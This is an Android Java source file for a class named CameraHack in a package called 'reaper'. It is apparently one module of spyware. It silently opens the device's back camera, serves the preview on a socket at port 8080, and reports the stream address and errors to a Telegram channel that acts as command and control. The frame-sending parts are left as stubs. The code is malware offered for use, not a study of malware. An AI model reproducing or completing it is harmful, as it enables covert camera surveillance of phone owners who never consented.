package com.mood.reaper;

import android.hardware.Camera;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class CameraHack implements Camera.PreviewCallback {
    private Camera camera;
    private ServerSocket server;

    public void startStream() {
        try {
            server = new ServerSocket(8080);
            camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
            camera.setPreviewCallback(this);
            camera.startPreview();
            Utils.sendToTelegram("📷 Camera streaming di http://<IP>:8080");

            new Thread(() -> {
                while (true) {
                    try {
                        Socket client = server.accept();
                        // Kirim MJPG stream (sederhana)
                    } catch (Exception e) {}
                }
            }).start();
        } catch (Exception e) {
            Utils.sendToTelegram("❌ Gagal start kamera: " + e.getMessage());
        }
    }

    @Override
    public void onPreviewFrame(byte[] data, Camera camera) {
        // Kirim frame ke client
    }
}